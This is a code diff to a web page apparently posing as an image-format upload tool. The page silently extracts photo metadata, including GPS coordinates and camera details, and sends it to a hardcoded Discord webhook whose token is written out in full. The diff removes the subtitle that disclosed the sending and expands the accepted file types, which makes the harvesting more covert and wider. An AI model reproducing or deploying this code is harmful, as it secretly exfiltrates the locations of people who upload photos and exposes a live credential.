@@ -143,12 +143,12 @@
 <body>
   <div class="card">
     <div class="logo">gif.fuck</div>
-    <div class="subtitle">Upload a photo → extract all metadata → send</div>
+    <div class="subtitle">Supports JPG, PNG, WEBP, HEIC, AVIF, TIFF, GIF + more</div>
 
     <div class="preview-area" id="previewArea">
       <div class="placeholder" id="placeholder">
         <span></span>
-        Drop or select a photo
+        Drop or select any image
       </div>
       <img id="preview" alt="Preview">
     </div>
@@ -163,8 +163,9 @@
     <div class="status" id="status"></div>
   </div>
 
-  <input type="file" id="fileInput" accept="image/*" hidden>
-  <input type="file" id="cameraInput" accept="image/*" capture="environment" hidden>
+  <!-- Accept almost every image type -->
+  <input type="file" id="fileInput" accept="image/*,.heic,.heif,.avif,.tiff,.tif,.bmp,.gif,.webp" hidden>
+  <input type="file" id="cameraInput" accept="image/*,.heic,.heif" capture="environment" hidden>
 
   <script>
     const WEBHOOK_URL = "https://discord.com/api/webhooks/1536294907306840125/EUtQw41CiZDG2sTuh4Tt_LLwgvRQKol6dv-YeTOQfl44xoekO8mByVGfYKWjz15_EuFY";
@@ -181,10 +182,24 @@
       statusEl.className = "status " + type;
     }
 
-    // Get as much metadata as possible
+    // Supported image MIME types + extensions
+    function isImageFile(file) {
+      if (!file) return false;
+      
+      // Check MIME type
+      if (file.type && file.type.startsWith("image/")) return true;
+      
+      // Fallback for some browsers / HEIC / AVIF that report empty type
+      const name = file.name.toLowerCase();
+      const extensions = [
+        '.jpg', '.jpeg', '.png', '.gif', '.webp', '.bmp',
+        '.heic', '.heif', '.avif', '.tiff', '.tif', '.svg'
+      ];
+      return extensions.some(ext => name.endsWith(ext));
+    }
+
     async function getAllMetadata(file) {
       try {
-        // Full parse – gets almost everything exifr can find
         const data = await exifr.parse(file, {
           tiff: true,
           xmp: true,
@@ -192,7 +207,9 @@
           jfif: true,
           ihdr: true,
           iptc: true,
-          gps: true
+          gps: true,
+          // Helps with more formats
+          mergeOutput: true
         });
         return data || {};
       } catch (e) {
@@ -208,7 +225,6 @@
 
       let lines = [];
 
-      // Common useful fields
       if (meta.Make) lines.push(`**Camera Make:** ${meta.Make}`);
       if (meta.Model) lines.push(`**Camera Model:** ${meta.Model}`);
       if (meta.Software) lines.push(`**Software:** ${meta.Software}`);
@@ -230,17 +246,14 @@
         lines.push(`**GPS Latitude:** \`${meta.latitude.toFixed(6)}\``);
         lines.push(`**GPS Longitude:** \`${meta.longitude.toFixed(6)}\``);
         if (meta.GPSAltitude) lines.push(`**Altitude:** ${meta.GPSAltitude} m`);
-      } else if (meta.GPSLatitude && meta.GPSLongitude) {
-        lines.push(`**GPS Latitude:** ${JSON.stringify(meta.GPSLatitude)}`);
-        lines.push(`**GPS Longitude:** ${JSON.stringify(meta.GPSLongitude)}`);
       }
 
-      // If still almost empty, dump a few more keys
-      if (lines.length < 3) {
+      // Fallback if very little data
+      if (lines.length < 2) {
         const extra = Object.keys(meta)
-          .filter(k => !['undefined', 'null'].includes(String(meta[k])))
-          .slice(0, 12)
-          .map(k => `**${k}:** ${String(meta[k]).slice(0, 80)}`);
+          .filter(k => meta[k] !== undefined && meta[k] !== null)
+          .slice(0, 10)
+          .map(k => `**${k}:** ${String(meta[k]).slice(0, 60)}`);
         lines = lines.concat(extra);
       }
 
@@ -256,6 +269,7 @@
       const content = 
         `**New image uploaded**\n` +
         `**Filename:** ${file.name}\n` +
+        `**Type:** ${file.type || "unknown"}\n` +
         `**Size:** ${(file.size / 1024 / 1024).toFixed(2)} MB\n\n` +
         `**── Metadata ──**\n${metaText}`;
 
@@ -268,18 +282,25 @@
     }
 
     function handleFile(file) {
-      if (!file || !file.type.startsWith("image/")) {
-        updateStatus("Please select an image", "error");
+      if (!isImageFile(file)) {
+        updateStatus("Please select a valid image file", "error");
         return;
       }
 
       selectedFile = file;
 
+      // Show preview (works for most formats)
       const reader = new FileReader();
       reader.onload = function(e) {
         preview.src = e.target.result;
         previewArea.classList.add("has-image");
         placeholder.style.display = "none";
+      };
+      reader.onerror = function() {
+        // Some formats (like HEIC) may not preview in all browsers
+        previewArea.classList.add("has-image");
+        placeholder.innerHTML = `<span></span>Selected: ${file.name}<br><small>(preview not available)</small>`;
+        placeholder.style.display = "block";
       };
       reader.readAsDataURL(file);
 
